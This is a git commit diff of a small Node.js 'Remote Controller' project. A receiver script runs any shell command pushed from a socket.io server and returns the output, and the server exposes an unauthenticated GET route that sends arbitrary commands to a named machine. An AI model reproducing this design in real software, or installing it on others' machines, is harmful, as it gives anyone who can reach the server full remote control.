20b94fa365e4a82e76569fce4e34fbc787ab3ae6
Ashwin <mahesh.ashwin1998@gmail.com>
2020-04-26 17:35:06 -0400

    Receiver and server side for receiver done

--- Receiver/receiver.js
+++ Receiver/receiver.js
@@ -7,14 +7,35 @@ const socket = io.connect(`${connectionAddr}:${PORT}`, {
   reconnection: true,
 });
 
-socket.on("connect", () => {
-  console.log("Connected to server");
+let USER = "";
+
+exec("echo $USER", (err, stdout, stderr) => {
+  if (err) console.log("There was a node error: ", err);
+  if (stderr) console.log("There was a bash error: ", stderr);
+  else USER = stdout;
 });
 
-exec("ls ~", (err, stdout, stderr) => {
-  if (err) console.log(err);
-  if (stderr) console.log(stderr);
-  else {
-    console.log(stdout);
-  }
+socket.on("connect", () => {
+  log("info", "Connected to server");
+  socket.emit("new-user", USER);
 });
+
+socket.on("perform-command", (command) => {
+  log("command", `${command}`);
+  let result = "";
+  exec(command, (err, stdout, stderr) => {
+    if (err) result = err;
+    else if (stderr) result = stderr;
+    else result = stdout;
+
+    log("result", `${result}`);
+    socket.emit("performed-command", {
+      command: command,
+      result: result,
+    });
+  });
+});
+
+function log(title, message) {
+  console.log(`[${title.toUpperCase()}] ${message}`);
+}
--- Server/server.js
+++ Server/server.js
@@ -3,23 +3,45 @@ const bodyParser = require("body-parser");
 const http = require("http");
 // const io = require("socket.io")(http);
 const SEND_PORT = 7681;
-const REC_PORT = 7680;
-const io = require("socket.io").listen(SEND_PORT);
+const REC_PORT = 7670;
+const io = require("socket.io");
+
+const sendIO = io.listen(SEND_PORT);
+// const recIO = io.listen(REC_PORT);
 
 const app = express();
 
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-io.on("connection", (socket) => {
-  console.log("A user is connected:", socket.client.id);
+const users = {};
+
+sendIO.on("connection", (socket) => {
+  log("connection", `${socket.client.id}`);
+  socket.on("new-user", (newUser) => {
+    log("new user", `${newUser}`);
+    users[newUser.substr(0, newUser.length - 1)] = socket;
+
+    socket.on("performed-command", (data) => {
+      const { command, result } = data;
+      log("command", `${command}`);
+      log("result", `${result}`);
+    });
+  });
 });
 
-app.post("/sendCommand", (req, res) => {
-  const { command } = req.body;
-  io.emit("command", command);
+//Replace this with receiver socket once finished
+
+app.get("/sendCommand/:user/:command", (req, res) => {
+  const { user, command } = req.params;
+  users[user].emit("perform-command", command);
+  return res.json({ yes: 1 });
 });
 
 app.listen(REC_PORT, () => {
   console.log(`Remote Controller Server is listening on port ${REC_PORT}`);
 });
+
+function log(title, message) {
+  console.log(`[${title.toUpperCase()}] ${message}`);
+}
